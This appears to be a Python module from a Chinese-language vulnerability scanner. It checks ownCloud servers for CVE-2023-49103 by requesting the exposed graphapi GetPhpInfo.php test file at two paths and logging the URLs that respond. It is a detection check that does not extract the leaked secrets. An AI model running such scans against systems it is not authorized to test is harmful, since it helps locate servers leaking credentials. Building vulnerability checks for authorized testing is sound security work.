#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
urllib3.disable_warnings()


class Cve_2023_49103:

    def run(self, urls):
        url = urls + '/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php'
        try:
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=5,proxies=self.proxy)
            if response.status_code == 200 and response.url == url:
                OutPrintInfoSuc("OwnCloud", f'存在OwnCloud敏感信息泄漏 {url}')
                if self.batch:
                    with open("./result/owncloud_2023_49103.txt","a") as w:
                        w.write(f"{url}\n")
            else:
                if not self.batch:
                    OutPrintInfo("OwnCloud", '不存在OwnCloud敏感信息泄漏')
        except Exception:
            if not self.batch:
                OutPrintInfo("WangGuan", "目标请求出错")
    def run2(self, urls):
        url = urls + '/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php'
        try:
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=5,proxies=self.proxy)
            if response.status_code == 200 and response.url == url:
                OutPrintInfoSuc("OwnCloud", f'存在OwnCloud敏感信息泄漏 {url}')
                if self.batch:
                    with open("./result/owncloud_2023_49103.txt","a") as w:
                        w.write(f"{url}\n")
            else:
                if not self.batch:
                    OutPrintInfo("OwnCloud", '不存在OwnCloud敏感信息泄漏')
        except Exception:
            if not self.batch:
                OutPrintInfo("WangGuan", "目标请求出错")
    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("OwnCloud", '开始执行OwnCloud敏感信息泄漏检测...')
            OutPrintInfo("OwnCloud", '开始执行POC-1...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("OwnCloud", '开始执行POC-2...')
        self.run2(url)
        if not self.batch:
            OutPrintInfo("OwnCloud",'OwnCloud敏感信息泄漏检测结束')